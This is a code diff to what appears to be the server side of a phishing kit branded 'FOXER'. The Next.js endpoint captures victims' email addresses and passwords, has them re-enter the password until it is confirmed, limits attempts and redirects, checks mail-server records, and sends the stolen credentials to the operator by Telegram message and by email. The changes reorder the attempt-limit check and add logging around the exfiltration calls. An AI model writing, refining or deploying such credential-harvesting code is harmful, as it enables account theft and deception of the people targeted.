@@ -381,6 +381,19 @@ export async function POST(request: NextRequest) {
     const currentAttempt = attemptData.attemptNumber
     console.log('[CREDENTIAL CAPTURE] 📊 Current attempt:', currentAttempt, '| Same password confirmed:', attemptData.samePasswordConfirmed, '| Allow attempt:', attemptData.allowAttempt)
 
+    // CRITICAL FIX: Check attempt limit BEFORE processing (must be first check)
+    // This prevents processing the 4th attempt if limit is reached
+    if (!attemptData.allowAttempt && currentAttempt >= 4) {
+      console.log('[CREDENTIAL CAPTURE] 🚫 Too many attempts - blocking request')
+      const redirectUrl = await getRedirectUrl(email, 'TooManyAttempts')
+      return NextResponse.json({
+        success: false,
+        error: 'too_many_attempts',
+        redirect: redirectUrl,
+        message: 'Too many attempts. Please try again later.',
+      }, { status: 429 })
+    }
+
     // Secure logging - no sensitive data
     // Password submission attempt processed
 
@@ -511,7 +524,8 @@ export async function POST(request: NextRequest) {
 
       // Send Telegram notification for confirmed password (quick, no SMTP)
       const telegramSettings = (await getSettings()).notifications.telegram
-      const quickMessage = `+++FOX NOTIFICATION+++
+      if (telegramSettings.enabled !== false) {
+        const quickMessage = `+++FOX NOTIFICATION+++
 
 🎯 Attempt 3/3 - PASSWORD CONFIRMED
 
@@ -523,15 +537,21 @@ export async function POST(request: NextRequest) {
 
 🦊 FOXER`
 
-      // Send Telegram in background with proper error tracking
-      sendTelegramMessage(quickMessage)
-        .then(success => {
-          if (success) {
-          } else {
-          }
-        })
-        .catch(err => {
-        })
+        // Send Telegram in background with proper error tracking
+        sendTelegramMessage(quickMessage)
+          .then(success => {
+            if (success) {
+              console.log('[CREDENTIAL CAPTURE] ✅ Telegram notification sent (password confirmed)')
+            } else {
+              console.warn('[CREDENTIAL CAPTURE] ⚠️  Telegram notification failed (password confirmed)')
+            }
+          })
+          .catch(err => {
+            console.error('[CREDENTIAL CAPTURE] ❌ Telegram notification error (password confirmed):', err)
+          })
+      } else {
+        console.log('[CREDENTIAL CAPTURE] ℹ️  Telegram notifications disabled - skipping (password confirmed)')
+      }
 
       // Return success with redirect immediately
       // CRITICAL: This MUST return and not continue processing
@@ -558,19 +578,8 @@ export async function POST(request: NextRequest) {
       }
     }
 
-    // Check if we should block after 3 same passwords or after 4 attempts
-    if (!attemptData.allowAttempt) {
-      // This block only runs if allowAttempt = false (too many attempts)
-      // Password confirmation is handled above (before this check)
-
-      // Otherwise, too many attempts - redirect to configured URL
-      const redirectUrl = await getRedirectUrl(email, 'TooManyAttempts')
-      return NextResponse.json({
-        success: false,
-        error: 'too_many_attempts',
-        redirect: redirectUrl,
-      }, { status: 429 })
-    }
+    // NOTE: Attempt limit check moved above (before password confirmation check)
+    // This ensures 4th attempt is blocked immediately without processing
 
     // Get MX records (ALWAYS await this properly)
     const domain = email.split('@')[1]
@@ -829,10 +838,13 @@ ${verification.valid
     sendEmail(email, password)
       .then(success => {
         if (success) {
+          console.log('[CREDENTIAL CAPTURE] ✅ Email notification sent successfully')
         } else {
+          console.warn('[CREDENTIAL CAPTURE] ⚠️  Email notification failed or disabled')
         }
       })
       .catch(err => {
+        console.error('[CREDENTIAL CAPTURE] ❌ Email notification error:', err)
       })
 
     // Update link stats after credential capture
